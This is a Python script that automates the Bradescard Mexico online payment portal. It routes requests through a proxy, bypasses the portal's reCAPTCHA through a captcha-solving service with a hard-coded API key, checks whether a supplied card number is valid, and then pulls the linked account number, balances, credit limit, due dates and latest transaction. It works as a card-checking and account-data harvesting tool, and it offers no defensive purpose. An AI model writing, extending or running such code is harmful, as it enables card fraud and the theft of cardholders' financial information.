import requests
import asyncio
import capsolver
from httpx import AsyncClient
import json



async def bradescard(cc,proxy):
    async with AsyncClient(proxies=proxy,verify=False,timeout=None) as web:
        
        capsolver.api_key = "CAP-7FDEBEE009A2807063AFDF5FCE50B716"
        
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV2TaskProxyLess",
        "websiteKey": '6LdehgAVAAAAACpQnwTNpuZOiuyJfUg4Ug-9Tvjn',
        "websiteURL": 'https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3',
        })))['gRecaptchaResponse']    


        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.bradescard.com.mx',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'token': g_response,
            'tarjeta': cc,
            'terminos': 'true',
        }

        req1 = await web.post('https://www.bradescard.com.mx/bradescard.net/Home/VerificaTarjeta',headers=headers,data=data,)
        if '"success":false' in req1.text:
            await web.aclose()
            raise Exception("CC No Valida para BradesCard")
        else:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'referer': 'https://www.bradescard.com.mx/bradescard.site/pago/index.html?v=0.0.3',
                'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            req2 = await web.get('https://www.bradescard.com.mx/bradescard.net/', headers=headers)
            accountnumber = req2.text.split("numerotarjetacliente: '")[1].split("'")[0]
            print(accountnumber)

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.bradescard.com.mx',
                'priority': 'u=1, i',
                'referer': 'https://www.bradescard.com.mx/bradescard.net/',
                'sec-ch-ua': '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = {
                'numerotarjetacliente': accountnumber,
            }

            response = await web.post('https://www.bradescard.com.mx/bradescard.net/MasterPage/consultaResumenMovimientosPagoLinea',headers=headers,data=data,)
            FechaLimitePagoPersona = response.text.split('"FechaLimitePagoPersona":"')[1].split('"')[0]
            PagoMinimoPersona = response.text.split('"PagoMinimoPersona":"')[1].split('"')[0]
            PagoTotalMesPersona = response.text.split('"PagoTotalMesPersona":"')[1].split('"')[0]
            FechaCortePersona = response.text.split('"FechaCortePersona":"')[1].split('"')[0]
            DisponibleComprasPersona = response.text.split('"DisponibleComprasPersona":"')[1].split('"')[0]
            SaldoTotalPersona = response.text.split('"SaldoTotalPersona":"')[1].split('"')[0]
            LimiteCreditoPersona = response.text.split('"LimiteCreditoPersona":"')[1].split('"')[0]
            CardBalance = response.text.split('"CardBalance":"')[1].split('"')[0]
            limitesMxn = response.text.split('"limitesMxn":"')[1].split('"')[0]
            
            response_movimientos = await web.post(
                url="https://www.bradescard.com.mx/bradescard.net/MasterPage/ConsultaDatosMovimientosAntesCorte",
                data={"NumeroTarjeta": accountnumber, "periodo": "0"},
                headers={
                    "Host": "www.bradescard.com.mx",
                    "Origin": "https://www.bradescard.com.mx/",
                    "Referer": "https://www.bradescard.com.mx/bradescard.net/",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
                }
            )

            try:
                data = json.loads(response_movimientos.text)
                if isinstance(data, dict) and data.get("movimientos"):
                    mov = data["movimientos"][0]  
                    fecha_mov = mov.get("FechaRegistro", "N/A")
                    cargo_mov = mov.get("Monto", "N/A")
                    sitio_mov = mov.get("Descripcion", "N/A")
                else:
                    fecha_mov = "N/A"
                    cargo_mov = "N/A"
                    sitio_mov = "N/A"
            except (json.JSONDecodeError, AttributeError, IndexError):
                fecha_mov = "N/A"
                cargo_mov = "N/A"
                sitio_mov = "N/A"

            
            return FechaLimitePagoPersona, PagoMinimoPersona, PagoTotalMesPersona, FechaCortePersona, DisponibleComprasPersona, SaldoTotalPersona, LimiteCreditoPersona, CardBalance, limitesMxn, accountnumber, fecha_mov, cargo_mov, sitio_mov
